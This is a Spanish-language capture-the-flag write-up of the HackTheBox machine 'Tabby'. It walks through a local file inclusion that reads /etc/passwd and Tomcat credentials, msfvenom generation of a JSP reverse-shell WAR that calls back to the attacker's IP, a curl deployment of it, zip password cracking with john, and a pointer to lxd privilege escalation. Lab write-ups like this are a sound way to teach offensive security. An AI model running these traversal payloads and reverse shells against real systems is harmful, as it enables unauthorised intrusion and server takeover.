# Tabby
## Initial Scan
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
```
## Enum
### HTTP
Bien en la pagina aparte de un correo con un domino no parece haber nada de utilidad
```
    sales@megahosting.htb
```
Vemos que en varios enlaces de la pagina como el de la seccion news hace referencia a el dominio de ese correo, añadamoslo a /etc/hosts y accedamos a esos enlaces.
### Tomcat
Al intentar acceder a /manager de tomcat nos enseña el mensaje:
```
 You are not authorized to view this page. If you have not changed any configuration files, please examine the file conf/tomcat-users.xml in your installation. That file must contain the credentials to let you use this webapp. 
```
## Exploit
### LFI
Esta llamada parece acceder directamente a un archivo:
```
http://megahosting.htb/news.php?file=statement
```
Veamos si tenemos arbitrary file read accedeiendo a /etc/passwd
```
http://megahosting.htb/news.php?file=../../../../../../../../../../../etc/passwd
```
Podemos afinarlo a:
```
http://megahosting.htb/news.php?file=../../../../etc/passwd
```
De aqui podemos sacar varios usuarios relevantes
```
root:x:0:0:root:/root:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
```
Tenemos un LFI y sabemos que hay un tomcat, hora de entrar hasta la cocina.
Mi primera idea fue esta:
```
http://megahosting.htb/news.php?file=../../../../opt/tomcat/conf/tomcat-users.xml
```
No funciona porque ese archivo no esta ahí , instalamos tomcat9 en local (sabemos que es la version 9 por que lo revela el puerto 8080) y tras esto miramos cuales son las rutas para este archivo, veremos que hay 2
```
/usr/share/tomcat9/etc/tomcat-users.xml
/etc/tomcat9/tomcat-users.xml
```
Probemos de nuevo pero con esta info, veremmos la pantalla en blanco al acceder pero si pulsamos ctrl u veremos que con la primera podemos leer esta configuracion
```
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
```
Con estas creds accedemos a tomcat
```
http://megahosting.htb:8080/host-manager/html
```
Ahora veamos como subir una reverse shell, en este caso no podemos subir un war desde la gui, primero generemos el war 
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IPtun0 LPORT=4444 -f war > shell.war    
```
Y vamos a subirlo directamente
```
curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/hell'
```
Abrimos un listener y accedemos al endpoint donde se ha desplegado ahora mejoramos nuestra shell

## Privesc
### Ash
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
> id uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```
Dentro de la carpeta de la pagina web encontramo un zip
```
16162020_backup.zip
```
Nos lo pasamos a local mediante base64, copiar , pegar , base64 y 
```
zip2john backup.txt > hash.txt
john hash.txt --wordlist=rockyou.txt
admin@it         (backup.zip)
```
En el backup no hay nada nuevo pero si  que podemos usar esa contraseña para acceder al usuario ash.

### Root
```
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```
Podemos ver que somos parte del grupo lxd (que tine un exploit bien conocido para escalar privilegios) este [artículo](https://www.hackingarticles.in/lxd-privilege-escalation/) lo explica, solo con seguir los pasos llegaremos a root

